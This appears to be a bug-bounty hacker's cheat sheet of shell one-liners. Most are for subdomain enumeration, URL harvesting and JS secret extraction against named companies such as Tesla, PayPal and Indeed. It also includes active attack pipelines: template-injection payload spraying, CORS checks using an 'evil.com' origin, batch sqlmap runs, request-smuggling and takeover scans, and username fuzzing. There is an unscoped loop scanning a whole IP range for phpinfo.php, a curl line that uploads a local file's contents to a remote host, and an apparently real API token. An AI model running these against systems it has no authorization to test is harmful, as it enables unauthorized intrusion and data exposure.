











grep -oiahE "https?://[^\"\\'> ]+\.js"

grep -Eo "(http|https)://[a-zA-Z0-9./~?=_-]*.js"

curl "https://ipinfo.io/AS36351/json?token=$ipinfo_token" | jq -r '.prefixes[].netblock' 

https://web.archive.org/web/timemap/json?url=hackerone.com/&fl=timestamp:4,original,urlkey&matchType=prefix&filter=statuscode:200&filter=mimetype:text/html&collapse=urlkey&collapse=timestamp:4&limit=100000
http://web.archive.org/cdx/search/cdx?url=myshopify.com*&output=json

curl -s "https://crt.sh/?q=%.$1&output=json"  | jq -r '.[].name_value' | sed 's/\*\.//g' | grep $1 | sort -u

curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1


curl "https://threatcrowd.org/searchApi/v2/domain/report/?domain=indeed.com" | jq -r  '.subdomains[]'  

for ipa in 98.13{6..9}.{0..255}.{0..255}; do
wget -t 1 -T 5 http://${ipa}/phpinfo.php; done&

waybackurls http://bounty.com | grep '=' | qsreplace "kingofbounty{{9*9}}"  | httpx -match-regex 'kingofbounty81' -threads 300 -http-proxy http://127.0.0.1:8080/
curl https://host.io/api/full/{ domain.com }?token=50cd58723e4a97

curl -F "x=`cat test.txt`" example.com

echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew

echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[./?=:&#]/\\n/g' | anew

amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500

ffuf -c -w ./wordlist.txt -u https://target/FUZZ -x http://localhost:8080

ffuf -c -w ./wordlist.txt -u https://target/FUZZ -replay-proxy http://localhost:8080

python3 getsrc.py 'https://www.glassdoor.com/employers/sign-up/?src=gdfoot' | xargs -I @ bash -c 'python3 ~/tools/LinkFinder/linkfinder.py -i @ -o cli'

python3 getsrc.py 'https://www.glassdoor.com/employers/sign-up/?src=gdfoot' | xargs -I @ bash -c 'python3 ~/tools/secretfinder/SecretFinder.py -i @ -o cli'

cat uber-threat | sed "s/,/\n/g" |  grep -Po "(([a-zA-Z0-9-_]+){1,3}\.){1,9}[a-za-z0-9-_]+\.[a-z]+" | sed "s/\"//g"

grep -Po "(([a-zA-Z0-9-_]+)\.)+paypal\.com"

altdns.py -i data/subdomains.txt -o data_output -w words.txt -r -s results_output.txt


httpx -l subfinder -silent | rush -j 300 'python3 smuggler.py -u {} --quiet'

assetfinder http://fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:http://evil.com" {} |  [[ $(grep -c "http://evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null

assetfinder -subs-only line.me -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "line"
chaos -d http://att.com -silent | httpx -silent | anew domains | rush 'subjack -w {} -t 100 -timeout 30 -ssl -c fingerprints.json -v 3' >> takeover
Fire
nuclei -l sub -t ~/nuclei-templates/{cves,subdomain-takeover,files,vulnerabilities,security-misconfiguration} -o nuclei-report -pbar

chaos -d line.me | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /tmp/jaeles-signatures/{cves,sensitive} -u @

findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1

//GoSpider to visit them and crawl them for all links
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'

cat probe | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo '(http|https)://[^/"].*.js+' | sed "s#] - #\n#g"  | anew | grep "line.me" | tee -a spider

jaeles scan -c 50 -s ~/../jaeles-signature/{cve,...} -U host -L 50 -v -G --html jaeles-report

nuclei -l host -t ~/../nuclei-template/{cve,...} -o result.txt -pBar

amass intel -org line  -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500

cat target.txt | waybackurls | gf xss 

echo "http://bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[:./?=:]/\\\n/g' | anew

dirs -u http://loadturn002.example.com -e * -w ~/mylist/ -t 100 -x 403,404,301

echo ".com/abc.php?cid=23&nid=333" | nuclei -t ~/auto_recon/sqli2.yaml

> ffuf -w SecLists/Usernames/xato-net-10-million-usernames.txt -u "https://domain.tld/rest/api/latest/groupuserpicker?query=FUZZ&maxResults=1" -mr "Showing 1"

cat file.txt | sort -u | rev | cut -d"." -f3- | rev | sed 's/-/\n/g' | sed 's/\./\n/g' | sort -u

python3 dirsearch.py -u http://aa.example.com -e * -w my_wordlist.txt -t 100 -x 403,404,301

curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew

cat ipforhost | sed 's/EOF//g' | awk 'NF' | tee -a ipforhosts

subfinder -d http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"

grep -E -o "([0-9]{1,3}[\.]){1,3}([0-9]{1,3})" trails | sort -u 
grep -Po "(([0-9]+\.)+[0-9]+)"

subfinder -silent -d rebelliondefense.com | dnsprobe -silent | awk  '{ print $2 }'  | sort -u  

xargs -n 1 -I{} sh -c 'echo {} | base64 -d'

cat yourSubdomains.txt | waybackurls | egrep ".*.js" > JSFiles.txt

cat vimeo-massdns | grep -e ' A ' | cut -d 'A' -f 2 | tr -d ' ' > vimeo-massdns-domain

cat superdrug-js-gau  | unfurl -u paths | sed "s#/#\n#g"

cat index.min.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

sudo amass enum -passive -d superdrug.com -src | awk '{print $2}' |  tee -a superdrug-subdomain

cat~/something.txt | xargs -P4 -I{} -n 1 python3 dirsearch.py -r -b -w ~/path.txt -t 40 -e html --timeout=3 -u {}

cat xyz | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk | grep Status:200

echo "domain.com" | waybackurls | cut -d "/" -f 4,5 | sed 's/?.*//' | sort -u


while read u; do echo "$(printf '%-100s' "$u")-> $(( curl -I -s -m 5 -k "$u"||echo KO) | head -n 1 -)"; done


for ip in $(cat final-ips.txt ); \
do \
	org=$(curl -s "https://ipinfo.io/$ip" | jq -r '.org' ); \
  	title=$(timeout 2 curl -s -k -H "Host: indeed.com" "https://$ip/" | pup 'title text{}'); \
	echo "IP: $ip Title: $title Org: $org"; \
done 

curl -s <https://easyasn.xyz/companies/amazon/ranges.txt> | grep -v ":"



